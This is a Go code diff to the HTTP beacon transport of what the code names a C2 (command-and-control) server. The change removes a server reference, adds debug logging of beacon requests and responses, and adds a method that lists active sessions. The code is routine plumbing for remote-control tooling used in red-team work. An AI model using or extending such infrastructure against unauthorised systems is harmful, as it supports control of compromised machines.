@@ -29,7 +29,6 @@ type HTTPTransport struct {
 		Debug(string, ...interface{})
 		Error(string, ...interface{})
 	}
-	c2Server    *Server // Reference to C2 server for session/task management
 	sessions    map[string]*transportSession
 	sessionsMu  sync.RWMutex
 	taskQueue   *tasks.Queue
@@ -223,8 +222,8 @@ func hasProtocol(addr string) bool {
 }
 
 func (ht *HTTPTransport) handleBeacon(w http.ResponseWriter, r *http.Request) {
-	ht.logger.Debug("Incoming beacon request from %s (method: %s, headers: %v)", 
-		r.RemoteAddr, r.Method, r.Header)
+	ht.logger.Debug("Incoming beacon request from %s (method: %s, URI: %s, headers: %v)", 
+		r.RemoteAddr, r.Method, r.RequestURI, r.Header)
 	
 	if r.Method != http.MethodPost && r.Method != http.MethodGet {
 		ht.logger.Error("Invalid HTTP method for beacon: %s from %s", r.Method, r.RemoteAddr)
@@ -304,6 +303,9 @@ func (ht *HTTPTransport) handleBeacon(w http.ResponseWriter, r *http.Request) {
 		"sleep":      ht.config.Communication.Sleep.Seconds(),
 		"jitter":     ht.config.Communication.Jitter,
 	}
+	
+	ht.logger.Debug("Beacon response for session %s: session_id=%s, tasks=%d, sleep=%.2fs, jitter=%.2f", 
+		sessionID, sessionID, len(pendingTasks), ht.config.Communication.Sleep.Seconds(), ht.config.Communication.Jitter)
 	
 	w.Header().Set("Content-Type", "application/json")
 	if err := json.NewEncoder(w).Encode(response); err != nil {
@@ -484,6 +486,24 @@ func (ht *HTTPTransport) getPendingTasks(sessionID string) []map[string]interfac
 	}
 	
 	return tasks
+}
+
+// GetSessions returns all active sessions (for syncing with session manager)
+func (ht *HTTPTransport) GetSessions() map[string]*Session {
+	ht.sessionsMu.RLock()
+	defer ht.sessionsMu.RUnlock()
+	
+	result := make(map[string]*Session, len(ht.sessions))
+	for id, ts := range ht.sessions {
+		result[id] = &Session{
+			ID:          ts.ID,
+			RemoteAddr:  ts.RemoteAddr,
+			ConnectedAt: ts.ConnectedAt,
+			LastSeen:    ts.LastSeen,
+			Metadata:    ts.Metadata,
+		}
+	}
+	return result
 }
 
 func generateTransportSessionID() string {
